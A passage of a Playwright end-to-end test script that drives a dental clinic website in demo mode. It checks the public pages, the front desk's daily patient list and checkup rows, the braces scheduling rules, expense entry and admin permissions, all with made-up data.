// End-to-end check of the website in DEMO mode with a real headless browser.
// Usage: node tests/ui.spec.mjs [baseUrl] [screenshotDir]
import { chromium } from 'playwright';
import assert from 'node:assert/strict';
import fs from 'node:fs';

const BASE = process.argv[2] || 'http://localhost:8765/';
const SHOTS = process.argv[3] || null;
if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });

const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined });
const errors = [];
let passed = 0;
// A step that makes the app fail on purpose (a function that is too old, a dropped connection) expects the console.error the app writes for it.
const expectErrors = (re) => { for (let i = errors.length - 1; i >= 0; i -= 1) if (re.test(errors[i])) errors.splice(i, 1); };

async function newPage(viewport = { width: 1366, height: 860 }, options = {}) {
  const page = await browser.newPage({ viewport, ...options });
  // Demo mode needs nothing from the internet; outside hosts (fonts, CDN) are cut off so a slow network cannot hang the test.
  await page.route((url) => !/^(localhost|127\.0\.0\.1)$/.test(url.hostname) && url.protocol.startsWith('http'), (r) => r.abort());
  // The live site has its Supabase keys filled in; the test always runs the made-up DEMO data instead.
  await page.route('**/js/config.js', async (r) => {
    const res = await r.fetch();
    const body = (await res.text()).replace(/SUPABASE_URL: '[^']*'/, "SUPABASE_URL: ''").replace(/SUPABASE_ANON_KEY: '[^']*'/, "SUPABASE_ANON_KEY: ''");
    await r.fulfill({ response: res, body });
  });
  page.setDefaultTimeout(15000);
  page.on('pageerror', (e) => errors.push(`pageerror: ${e.message}`));
  page.on('console', (m) => { if (m.type() === 'error' && !/fonts\.(googleapis|gstatic)|ERR_|Failed to load resource/.test(m.text())) errors.push(`console: ${m.text()}`); });
  // A refused or reset load from the site's own host would otherwise show up only as a 15 s timeout.
  page.on('requestfailed', (r) => {
    if (/^https?:\/\/(localhost|127\.0\.0\.1)[:/]/.test(r.url()) && !/ERR_ABORTED/.test(r.failure()?.errorText || '')) errors.push(`requestfailed: ${r.url()} ${r.failure()?.errorText}`);
  });
  return page;
}
async function step(name, fn) {
  try { await fn(); passed++; console.log('ok -', name); } catch (e) {
    console.log('FAIL -', name, '\n   ', e.message.split('\n')[0]); process.exitCode = 1;
    // Close any dialog the failed step left open, so it cannot block the next step.
    for (const pg of browser.contexts().flatMap((c) => c.pages())) await pg.keyboard.press('Escape').catch(() => {});
  }
}
const shot = async (page, name) => { if (SHOTS) await page.screenshot({ path: `${SHOTS}/${name}.png`, fullPage: false }); };
async function loginAs(page, label) {
  await page.goto(BASE + '#/login/staff');
  await page.getByRole('button', { name: new RegExp(label) }).click();
  await page.waitForSelector('.topbar');
}
// "Try another role" takes the staff screen away at once, but the logout itself ends a moment later by moving to the home page. A step that
// goes to the login page before then is sent back to the home page, so wait for the home page (its doors) before going anywhere.
async function tryAnotherRole(page) {
  await page.getByRole('button', { name: 'Try another role' }).click();
  await page.waitForSelector('.door');
}

// ------------------------------------------------------------- public
const page = await newPage();
await step('home shows the smile, three doors and calendar', async () => {
  await page.goto(BASE);
  // With WebGL the hero is the photo card (canvas) and the CSS arch is hidden; without it the 24 CSS teeth show.
  await page.waitForSelector('.smile-stage.has-card canvas, .smile-stage:not(.has-card) .tooth');
  // The week with Dr. Ali fills in when the (demo) database answers, after the hero is already there: wait for it, or a slow first load
  // counts 0 days (this first step failed now and then on a slow first load, and its messages did not say which count was wrong).
  await page.locator('.sx-day').first().waitFor();
  assert.equal(await page.locator('.tooth').count(), 24, 'tooth count');
  for (const t of ['Patient', 'Visitor', 'Our results', 'Employee']) assert.ok(await page.locator('.door', { hasText: t }).count(), `door ${t}`);
  assert.equal(await page.locator('.sx-day').count(), 7, 'sx-day count');
  await shot(page, '01-home');
});
await step('Our results: a grid of square photos; a click opens the photo large, Close goes back', async () => {
  await page.click('.door:has-text("Our results")');
  await page.waitForSelector('h1:has-text("Our results")');
  const tiles = page.locator('.results-grid .results-tile');
  await tiles.first().waitFor();
  const box = await tiles.first().boundingBox();
  assert.ok(box && Math.abs(box.width - box.height) < 2, `square thumbnails: ${box && box.width}x${box && box.height}`);
  await tiles.first().click();
  const dlg = page.getByRole('dialog', { name: 'Our results' });
  await dlg.waitFor();
  assert.ok(await dlg.locator('img.results-big').getAttribute('src'), 'the large photo is shown');
  assert.match(await dlg.locator('.results-caption').innerText(), /1 of \d+/);
  await dlg.getByRole('button', { name: 'Close' }).click();
  await dlg.waitFor({ state: 'detached' });
  await page.goto(BASE);
  await page.waitForSelector('.door:has-text("Visitor")');
});
await step('visitor page lists benefits, braces options and WhatsApp button', async () => {
  await page.click('.door:has-text("Visitor")');
  await page.waitForSelector('.brace-card');
  assert.ok((await page.locator('.benefit').count()) >= 6);
  assert.ok(await page.locator('a:has-text("Message on WhatsApp")').count());
  await shot(page, '02-visitor');
});
// The owner (15 Oct 2026): the doors already lead to the patient login and the treatments, so the top bar links to the two forms
// instead, and the two buttons that were under the doors are gone. [text, href, aria-current] of each top bar link:
const barLinks = (pg) => pg.locator('.site-header nav a').evaluateAll((as) => as.map((a) => [a.textContent, a.getAttribute('href'), a.getAttribute('aria-current')]));
const BAR = [['Join our team', '#/join', null], ['Complaints & suggestions', '#/feedback', null]];
await step('top bar: "Join our team" and "Complaints & suggestions" on every public page, the form on screen marked; the doors still lead to the patient login and the treatments', async () => {
  assert.deepEqual(await barLinks(page), BAR, 'on the visitor page');
  await page.locator('.site-header nav a', { hasText: 'Complaints & suggestions' }).click();
  await page.waitForSelector('h1:has-text("Complaints & suggestions")');
  assert.deepEqual(await barLinks(page), [BAR[0], ['Complaints & suggestions', '#/feedback', 'page']], 'on the feedback form');
  await page.locator('.site-header nav a', { hasText: 'Join our team' }).click();
  await page.waitForSelector('h1:has-text("Join our team")');
  assert.deepEqual(await barLinks(page), [['Join our team', '#/join', 'page'], BAR[1]], 'on the job form');
  await page.goto(BASE + '#/results');
  await page.waitForSelector('h1:has-text("Our results")');
  assert.deepEqual(await barLinks(page), BAR, 'on Our results');
  await page.goto(BASE + '#/clinics');
  await page.waitForSelector('#branches');
  assert.deepEqual(await barLinks(page), BAR, 'on the clinics (the homepage, scrolled)');
  await page.locator('.wordmark').click();
  await page.waitForSelector('.door');
  assert.deepEqual(await barLinks(page), BAR, 'on the homepage');
  assert.equal(await page.locator('.site-header a[href="#/login/patient"], .site-header a[href="#/visitor"]').count(), 0, 'the top bar does not repeat the doors');
  assert.equal(await page.locator('.hero-forms, .hero-body .btn').count(), 0, 'no form buttons under the doors');
  const doors = await page.locator('.door-row a.door').evaluateAll((as) => as.map((a) => [a.querySelector('strong').textContent, a.getAttribute('href')]));
  assert.deepEqual(doors, [['Patient', '#/login/patient'], ['Visitor', '#/visitor'], ['Our results', '#/results'], ['Employee', '#/login/staff']], 'the four doors are unchanged');
  await page.locator('.door', { hasText: 'Patient' }).click();
  await page.waitForSelector('h1:has-text("Patient login")');
});

// ------------------------------------------------------------- front desk
await step('front desk sees only their branch and the Aaj ki List', async () => {
  await loginAs(page, 'Front desk \\(North Nazimabad\\)');
  await page.locator('.topnav .menu:has-text("Aaj ki List") > button').click();
  await page.locator('.topnav .menu-list a:text-is("Aaj ki List")').click(); // (not "History of Aaj ki List" next to it)
  await page.waitForSelector('table.sheet tbody tr');
  const options = await page.locator('.sheet-toolbar select').first().locator('option').allTextContents();
  assert.deepEqual(options, ['North Nazimabad']);
  assert.ok((await page.locator('table.sheet tbody tr').count()) >= 5);
  // P.P, the sheet's dues column: red, written like the sheet (15k)
  assert.ok(await page.locator('table.sheet tbody td.pp .pp-due').count(), 'dues visible in P.P');
  assert.match(await page.locator('table.sheet tbody td.pp .pp-due').first().getAttribute('title'), /^Pending dues Rs/);
  await shot(page, '03-sheet-frontdesk');
});
await step('front desk registers a new patient and gets the next Mr# (the website numbers from 50000, clear of Healthwire)', async () => {
  await page.fill('.add-panel input[type=search]', 'Komal Test');
  await page.click('.suggestions button:has-text("New patient")');
  await page.fill('.modal input[type=tel]', '0300 1234567');
  await page.click('.modal button:has-text("Create patient")');
  await page.waitForSelector('.toast:has-text("Mr# 50000")');
  await page.waitForSelector('table.sheet tbody tr:has-text("Komal Test")');
});
await step('front desk adds a walk-in with the "+ New walk-in" button', async () => {
  await page.click('.add-panel button:has-text("New walk-in")');
  await page.fill('.modal input[required]:not([type=tel])', 'Walkin Person');
  await page.fill('.modal input[type=tel]', '0301 7654321');
  await page.click('.modal button:has-text("Create patient")');
  await page.waitForSelector('table.sheet tbody tr:has-text("Walkin Person")');
});
await step('front desk cannot see accounts or admin', async () => {
  const nav = (await page.locator('.topnav a, .topnav .menu-list a').allTextContents()).map((t) => t.trim());
  assert.ok(!nav.includes('Access list') && !nav.includes('Staff accounts'));
  assert.ok(!nav.includes('Complaints'));
  assert.ok(!nav.includes('Financial'));
});
await step('front desk may make a patient portal login (owner decision, 9 Oct 2026): the button shows on the patient just registered and the username carries Mr# 50000', async () => {
  await page.goto(BASE + '#/staff/patients?q=Komal%20Test');
  await page.locator('table.list tbody tr', { hasText: 'Komal Test' }).locator('a').first().click();
  await page.waitForSelector('h1:has-text("Komal Test")');
  await page.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await page.getByRole('button', { name: 'Create portal login' }).click();
  const m = page.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), 'komaltest-50000@dralirashid.com');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
});
await step('top bar: patient search by name, Mr# and phone from any screen', async () => {
  const box = page.locator('.topsearch input');
  await box.fill('9812');
  await page.waitForSelector('.search-results a:has-text("Mr# 9812")');
  await box.fill('Hamza');
  await page.waitForSelector('.search-results a:has-text("Hamza Qureshi")');
  await box.fill('03010734521');
  await page.waitForSelector('.search-results a:has-text("Hamza Qureshi")');
  await page.locator('.search-results a').first().click();
  await page.waitForSelector('h1:has-text("Hamza Qureshi")');
  await box.fill('Zainab');
  await box.press('Enter');
  await page.waitForSelector('table.list tbody tr:has-text("Zainab Rizvi")');
  assert.equal(await page.locator('table.list tbody tr').count(), 1, 'Enter opens the Patients page with the search');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr');
});
await step('auto-save: editing treatment details shows saved state', async () => {
  const input = page.locator('table.sheet tbody tr:has-text("Komal Test") input[aria-label^="Treatment details"]');
  await input.fill('U L 018 PC refresh');
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
});
await step('flag patient for Dr. Ali from the sheet', async () => {
  await page.click('table.sheet tbody tr:has-text("Komal Test") .frozen .link-btn');
  await page.click('.modal button:has-text("Next appointment with Dr. Ali")');
  await page.locator('.modal').last().locator('textarea').fill('Bracket keeps breaking');
  await page.click('.modal button:has-text("Flag for Dr. Ali")');
  await page.waitForSelector('.toast:has-text("Flagged")');
  await page.keyboard.press('Escape');
});

// ------------------------------------------------------------- checkup patients on the Aaj ki List (front desk, North Nazimabad)
// (Checkup patients have no Mr#. Made-up names only; the demo keeps its data in memory, so the browser is never reloaded here.)
const checkupRow = (pg, name) => pg.locator(`table.sheet tbody tr.is-checkup:has(input[aria-label="Name of checkup patient ${name}"])`);
await step('front desk: the Aaj ki List shows the checkup patients of the day with no Mr# and no badge (as on the sheet), sorted like the sheet with a serial number on every row', async () => {
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
  const seeded = page.locator('table.sheet tbody tr.is-checkup');
  assert.ok((await seeded.count()) >= 2, 'the two seeded checkups of North Nazimabad');
  // Owner, 11 Oct 2026: no flags on the list. The row without an Mr# is the checkup patient, as on the sheet; a screen
  // reader hears "Checkup patient" with the name.
  assert.equal(await page.locator('table.sheet tbody .badge').count(), 0, 'no badge on the list');
  assert.deepEqual(await seeded.first().locator('th.name-col .sr-only').evaluateAll((els) => els.map((el) => el.textContent)), ['Checkup patient']);
  assert.match(await seeded.first().locator('td.mr-cell').innerText(), /no Mr#/);
  assert.equal(await seeded.first().locator('.quick-tap').count(), 0, 'no quick-tap button on a checkup row');
  // Owner, 11 Oct 2026: Waiting first, then In treatment, then Scheduled / no status, then Completed, then Cancelled and
  // No show; checkup patients by their own day status (not a block at the end), and inside one status the patients before
  // the checkup patients. Every row is numbered 1..n in that order in the "#" column, like the sheet's row numbers.
  const order = await page.locator('table.sheet tbody tr[data-id]').evaluateAll((trs) => trs.map((t) => ({
    checkup: t.classList.contains('is-checkup'),
    status: t.querySelector('select[aria-label^="Status for"]')?.value ?? '',
    serial: t.querySelector('td.rownum')?.textContent.replace(/\D/g, '') ?? '',
  })));
  const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
  const keys = order.map((r) => rank[r.status] * 2 + (r.checkup ? 1 : 0));
  assert.ok(keys.every((k, i) => i === 0 || keys[i - 1] <= k), `rows are sorted by status, patients before checkups: ${order.map((r) => r.status + (r.checkup ? '/c' : '')).join(', ')}`);
  assert.ok(order.findIndex((r) => r.checkup) < order.map((r) => r.checkup).lastIndexOf(false), 'a waiting checkup patient comes before the patients done (not at the end)');
  assert.deepEqual(order.map((r) => r.serial), order.map((_, i) => String(i + 1)), 'every row has its serial number 1..n');
  assert.ok(await page.locator('table.sheet thead th:has-text("Token")').count(), 'the token has its own column');
  assert.match(await page.locator('.sheet-counts').innerText(), /Checkups \d+/);
  await shot(page, '14-sheet-checkups');
});
await step('front desk: a checkup row\'s Doctor Name shows the names typed there as chips in each doctor\'s colour (grey for a name not on the clinic\'s list), and the text to type in once the cell is chosen', async () => {
  // Owner, 11 Oct 2026: "doctor names should have similar colours so they dont look all the same", on every row.
  const want = await page.evaluate(async () => {
    const m = await import('/js/views/staff/sheet.js');
    const { state } = await import('/js/state.js');
    const c = state.ref.clinicians.find((x) => x.display_name === 'Dr. Rabia (sample)');
    return `gs-${m.doctorTone(c.id, c.display_name)}`;
  });
  const cellOf = () => page.evaluate(() => {
    const box = [...document.querySelectorAll('table.sheet tbody tr.is-checkup .doctors-box')].find((b) => b.querySelector('input').value.startsWith('Dr. Rabia (sample)'));
    const chips = box.querySelector('.written-people');
    return { typed: box.querySelector('input').value, chips: [...chips.querySelectorAll('.person')].map((p) => [p.textContent, (p.className.match(/\bgs-\w+/) || [''])[0]]),
      chipsShown: getComputedStyle(chips).display !== 'none', textShown: getComputedStyle(box.querySelector('input')).color !== 'rgba(0, 0, 0, 0)' };
  });
  assert.notEqual(want, 'gs-grey');
  assert.deepEqual(await cellOf(), { typed: 'Dr. Rabia (sample)', chips: [['Rabia (sample)', want]], chipsShown: true, textShown: false }, 'the doctor\'s chip, as on the other rows');
  const box = page.locator('table.sheet tbody tr.is-checkup .doctors-box', { hasText: 'Rabia (sample)' });
  const input = box.locator('input');
  await box.click(); // (through the chips, to the cell)
  assert.ok(await input.evaluate((el) => el === document.activeElement), 'the cell has the cursor');
  assert.deepEqual(await cellOf(), { typed: 'Dr. Rabia (sample)', chips: [['Rabia (sample)', want]], chipsShown: false, textShown: true }, 'the text to type in');
  await page.keyboard.press('End');
  await page.keyboard.type(', Dr. Made Up');
  await page.keyboard.press('Tab');
  assert.deepEqual(await cellOf(), { typed: 'Dr. Rabia (sample), Dr. Made Up', chips: [['Rabia (sample)', want], ['Made Up', 'gs-grey']], chipsShown: true, textShown: false });
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  // (back as it was, for the steps below)
  await input.fill('Dr. Rabia (sample)');
  await input.press('Tab');
  assert.deepEqual((await cellOf()).chips, [['Rabia (sample)', want]]);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  await page.evaluate(() => document.activeElement?.blur());
});
await step('front desk: "+ Checkup patient" adds a checkup patient (no Mr#); details and status save; the row can be removed', async () => {
  await page.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = page.locator('.modal');
  await m.getByLabel(/^Name/).fill('Checkup Test Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550101');
  await m.getByLabel('Treatment', { exact: true }).fill('Scaling');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await page.waitForSelector('.toast:has-text("Checkup Test Person added as a checkup patient")');
  const row = checkupRow(page, 'Checkup Test Person');
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Scaling');
  assert.equal(await row.locator('input[aria-label^="Phone for"]').inputValue(), '0300 5550101');
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting', 'today: waiting');
  assert.doesNotMatch(await row.locator('td.mr-cell').innerText(), /\d/);
  await row.locator('input[aria-label^="Treatment details"]').fill('Scaling advised');
  await page.waitForTimeout(1200);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  assert.equal((await page.locator('.save-state').innerText()).trim(), 'All changes saved');
  await row.locator('select[aria-label^="Status for"]').selectOption('completed');
  await page.waitForTimeout(300);
  // Today reloads the list from the data layer: the typed details and the status are really saved.
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Treatment details"]').inputValue(), 'Scaling advised');
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  // Options -> Remove -> confirm
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
});
await step('front desk: a checkup patient whose phone belongs to a patient file is offered "Add Mr# N to the list instead"', async () => {
  await page.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = page.locator('.modal');
  await m.getByLabel(/^Name/).fill('Dup Check Person');
  await m.getByLabel(/^Phone number/).fill('03010734521');
  await m.getByLabel(/^Phone number/).press('Tab');
  await m.locator('.alert-warning:has-text("already has a patient file")').waitFor();
  const text = await m.locator('.alert-warning').innerText();
  const mr = text.match(/Mr# (\d+)/)[1];
  const before = await page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` }).count();
  await m.getByRole('button', { name: `Add Mr# ${mr} to the list instead` }).click();
  // (this patient is on the list already, so the list asks first; a second row is what this test adds)
  await page.locator('.modal h2:has-text("is already on the list")').waitFor();
  await page.locator('.modal').getByRole('button', { name: 'Add another row' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForFunction(([n, count]) => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')].filter((t) => t.textContent.includes(`Mr# ${n}`)).length === count, [mr, before + 1]);
  assert.equal(await page.locator('table.sheet tbody tr.is-checkup:has(input[aria-label="Name of checkup patient Dup Check Person"])').count(), 0, 'no checkup was made');
});
await step('front desk: the status filter and the find box apply to the checkup rows, and the dues filter hides them', async () => {
  // (status, doctor, group, dues and braces sit behind "Filters")
  await page.getByRole('button', { name: /^Filters/ }).click();
  await page.locator('select[aria-label="Filter by status"]').selectOption('completed');
  const kinds = await page.locator('table.sheet tbody tr.is-checkup select[aria-label^="Status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(kinds.every((v) => v === 'completed'), 'only completed checkups');
  await page.locator('select[aria-label="Filter by status"]').selectOption('');
  await page.locator('label:has-text("With dues") input').check();
  assert.equal(await page.locator('table.sheet tbody tr.is-checkup').count(), 0, 'the dues filter hides checkups');
  await page.locator('label:has-text("With dues") input').uncheck();
  await page.locator('input[aria-label="Find on this list"]').fill('checkup');
  assert.ok((await page.locator('table.sheet tbody tr.is-checkup').count()) >= 2, 'the word "checkup" finds checkup rows');
  await page.locator('input[aria-label="Find on this list"]').fill('');
});

await step('front desk: "Register as patient" on a checkup row gives an Mr#, and "Put Mr# N on this list" turns the row into a patient row', async () => {
  await page.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = page.locator('.modal');
  await m.getByLabel(/^Name/).fill('Register Flow Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550104');
  await m.getByLabel('Treatment', { exact: true }).fill('Whitening');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  const row = checkupRow(page, 'Register Flow Person');
  await row.waitFor();
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Register as patient' }).click();
  const dlg = page.locator('.modal');
  await dlg.getByRole('button', { name: 'Create patient file' }).click();
  await dlg.locator('.registered-mr').waitFor();
  const mr = (await dlg.locator('.registered-mr').innerText()).match(/Registered: Mr# (\d+)/)[1];
  await dlg.getByRole('button', { name: `Put Mr# ${mr} on this list` }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  const visit = page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` });
  await visit.waitFor();
  assert.equal(await visit.locator('input[aria-label^="Treatment for"]').inputValue(), 'Whitening', 'the visit carries what the checkup was for');
  assert.equal(await row.count(), 0, 'the checkup row is now a patient row');
  await page.goto(BASE + '#/staff/checkups?q=5550104');
  const link = page.locator('table.checkup-table tbody tr[data-id] a.mr');
  await link.waitFor();
  assert.equal((await link.innerText()).trim(), `Mr# ${mr}`, 'the Checkups page keeps the person, now with the Mr#');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr');
});
await step('front desk: the arrow keys move between the name cells of checkup rows', async () => {
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
  const names = page.locator('table.sheet tbody tr.is-checkup input[data-field="patient_name"]');
  assert.ok((await names.count()) >= 2);
  // (sorted by status, so patient rows, whose name is a button and not a typing cell, lie between them: they are passed over)
  assert.equal(await names.nth(0).evaluate((el) => el.closest('tr').nextElementSibling?.classList.contains('is-checkup')), false, 'a patient row below the first checkup row');
  await names.nth(0).focus();
  await page.keyboard.press('ArrowDown');
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), await names.nth(1).getAttribute('aria-label'));
});

await step('front desk: the same phone number twice on one day\'s list is flagged before the second checkup is added', async () => {
  const add = async (name, phone) => {
    await page.getByRole('button', { name: '+ Checkup patient' }).click();
    const m = page.locator('.modal');
    await m.getByLabel(/^Name/).fill(name);
    await m.getByLabel(/^Phone number/).fill(phone);
    await m.getByLabel(/^Phone number/).press('Tab');
    return m;
  };
  const first = await add('Twice Typed Person', '0300 5550955');
  assert.equal(await first.locator('.alert-warning:has-text("Already on the list for")').count(), 0, 'nothing to warn about the first time');
  await first.getByRole('button', { name: 'Add checkup patient' }).click();
  await checkupRow(page, 'Twice Typed Person').waitFor();
  const second = await add('Twice Typed Person', '0300-555 0955');
  await second.locator('.alert-warning:has-text("Already on the list for")').waitFor();
  assert.match(await second.locator('.alert-warning').innerText(), /Twice Typed Person \(0300 5550955\)\. Press Cancel unless this is a different person\./);
  // a different number is not flagged, and adding anyway stays possible
  await second.getByLabel(/^Phone number/).fill('0300 5550957');
  await second.getByLabel(/^Phone number/).press('Tab');
  await page.waitForFunction(() => !document.querySelector('.modal .alert-warning'));
  await second.getByRole('button', { name: 'Cancel' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  const row = checkupRow(page, 'Twice Typed Person');
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
});
await step('front desk: the token of a checkup row can be typed and saved (a website checkup has none until someone writes one)', async () => {
  const row = checkupRow(page, 'Bareera Khalid');
  const token = row.locator('input[aria-label^="Token of checkup patient"]');
  await token.waitFor();
  assert.equal(await token.inputValue(), '', 'no token yet');
  await token.fill('9');
  await token.press('Tab');
  await page.waitForTimeout(1200);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Token of checkup patient"]').inputValue(), '9', 'saved, and still there after the list is read again');
  await row.locator('input[aria-label^="Token of checkup patient"]').fill('');
  await row.locator('input[aria-label^="Token of checkup patient"]').press('Tab');
  await page.waitForTimeout(1200);
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Token of checkup patient"]').inputValue(), '', 'and can be cleared');
});
await step('front desk: the top search tells where a checkup patient is (no Mr#), with a link to the Checkups page', async () => {
  await page.getByLabel('Search patients').fill('Bareera');
  const results = page.locator('.search-results:has-text("No patient matches")');
  await results.waitFor();
  assert.match(await results.innerText(), /Checkup patients have no Mr#/);
  await results.getByRole('link', { name: 'Look on the Checkups page' }).click();
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.waitForFunction(() => {
    const rows = [...document.querySelectorAll('table.checkup-table tbody tr[data-id]')];
    return rows.length > 0 && rows.every((t) => t.textContent.includes('Bareera'));
  });
  assert.match(await page.evaluate(() => location.hash), /checkups[?]q=Bareera/);
  // a phone number is carried over as its digits (4 or more)
  await page.getByLabel('Search patients').fill('0300-5550701');
  const again = page.locator('.search-results:has-text("No patient matches")');
  await again.waitFor();
  assert.match(await again.getByRole('link', { name: 'Look on the Checkups page' }).getAttribute('href'), /checkups[?]q=03005550701$/);
  await page.getByLabel('Search patients').fill('');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
});

// ------------------------------------------------------------- assistant + braces rules
const p2 = await newPage();
await step('assistant: braces month guidance and group rule; no Invoice column for someone who does not see invoices', async () => {
  await loginAs(p2, 'Assistant');
  await p2.goto(BASE + '#/staff/sheet?branch=2');
  await p2.waitForSelector('table.sheet tbody tr');
  // (its cells would all be empty: Treatment Details has that room instead)
  const heads = (await p2.locator('table.sheet thead th:visible').allInnerTexts()).map((t) => t.replace('▾', '').trim());
  assert.deepEqual(heads, ['#', 'MR #', 'Patient Name', 'Month', 'Treatment', 'Token', 'Status', 'Group', 'Doctor Name', 'Treatment Details', 'P.P', 'Contact No', 'Reminder Status']);
  assert.equal(await p2.locator('table.sheet col').count(), heads.length, 'one column per heading');
  assert.ok(await p2.locator('table.sheet tbody tr').evaluateAll((trs, n) => trs.every((tr) => tr.children.length === n), heads.length), 'one cell per heading in every row');
  const monthBtn = p2.locator('table.sheet tbody tr .month-pill').first();
  await monthBtn.click();
  await p2.waitForSelector('.modal .stat');
  await shot(p2, '04-braces-guidance');
  await p2.keyboard.press('Escape');
});
await step('a Group 3 doctor is refused on a Group 1/2 month', async () => {
  // Find a waiting braces row whose month allows only Group 1/2 and try a Group 3 doctor
  const rows = p2.locator('table.sheet tbody tr');
  const n = await rows.count();
  let tried = false;
  for (let i = 0; i < n; i++) {
    const hint = await rows.nth(i).locator('.people .field-hint [aria-hidden="true"]').textContent({ timeout: 1000 }).catch(() => '');
    if (hint.startsWith('G1/2') || hint === 'G1 · check G1') {
      await rows.nth(i).locator('.add-person').click();
      await p2.click('.modal button:has-text("Dr. Nida (sample)")');
      await p2.waitForSelector('.toast-error');
      tried = true;
      await p2.keyboard.press('Escape');
      break;
    }
  }
  assert.ok(tried, 'found a Group 1/2 month row to test');
});
await step('photo month cannot be completed without photos', async () => {
  const row = p2.locator('table.sheet tbody tr:has(.photo-due)').first();
  if (await row.count()) {
    await row.locator('select[aria-label^="Status"]').selectOption('completed');
    await p2.waitForSelector('.toast-error');
  }
});

// ------------------------------------------------------------- accountant
const p3 = await newPage();
await step('accountant: P&L, expense entry and cash verification', async () => {
  await loginAs(p3, 'Accountant');
  await p3.goto(BASE + '#/staff/accounts');
  await p3.waitForSelector('.tab');
  await p3.getByRole('tab', { name: 'Expenses', exact: true }).click();
  await p3.getByLabel('Category').selectOption({ label: 'Rent' });
  await p3.getByLabel('Amount').fill('120000');
  await p3.locator('input[aria-label="Receipt photo"]').setInputFiles({ name: 'rent-receipt.png', mimeType: 'image/png', buffer: Buffer.from('89504e470d0a1a0a', 'hex') });
  await p3.click('button:has-text("Save expense")');
  await p3.waitForSelector('.toast:has-text("Expense")');
  await p3.waitForSelector('table.list tbody tr:has-text("Rent") button:has-text("View")');
  await p3.click('.tab:has-text("Branch income")');
  await p3.waitForSelector('table.list');
  await shot(p3, '05-accounts');
});

// ------------------------------------------------------------- admin
const p4 = await newPage();
await step('admin: access list checkboxes change permissions', async () => {
  await loginAs(p4, 'Dr. Ali Rashid');
  await p4.locator('.topnav .menu:has-text("More") > button').click();
  await p4.locator('.topnav .menu-list a:has-text("Access list")').click();
  await p4.waitForSelector('table.perm-grid');
  const box = p4.getByLabel('Assistant: Register new patients (auto Mr#)');
  assert.equal(await box.isChecked(), false);
  await box.check();
  await p4.waitForSelector('.toast:has-text("allowed")');
  await shot(p4, '06-access-list');
});
await step('admin: dashboard, Dr. Ali list and complaints', async () => {
  await p4.click('.topnav a:has-text("Today")');
  await p4.waitForSelector('.stat');
  await shot(p4, '07-today');
  await p4.locator('.topnav .menu:has-text("More") > button').click();
  await p4.locator('.topnav .menu-list a:has-text("Dr. Ali\'s list")').click();
  await p4.waitForSelector('table.list');
  assert.ok((await p4.locator('table.list tr').count()) >= 1);
  await p4.goto(BASE + '#/staff/complaints');
  await p4.waitForSelector('table.list');
});
await step('admin: patient profile with braces guidance', async () => {
  await p4.click('.topnav a:has-text("Patients")');
  await p4.waitForSelector('table.list tbody tr');
  await p4.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p4.waitForSelector('h2:has-text("Braces")');
  await shot(p4, '08-patient-profile');
});
await step('admin: adds a consent form to the patient record', async () => {
  await p4.waitForSelector('h2:has-text("Documents")');
  await p4.click('button:has-text("Add document")');
  await p4.setInputFiles('.modal input[type=file]', { name: 'consent.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 test') });
  await p4.click('.modal button:has-text("Save")');
  await p4.waitForSelector('.toast:has-text("Document saved")');
  await p4.waitForSelector('table.list td:has-text("Consent form")');
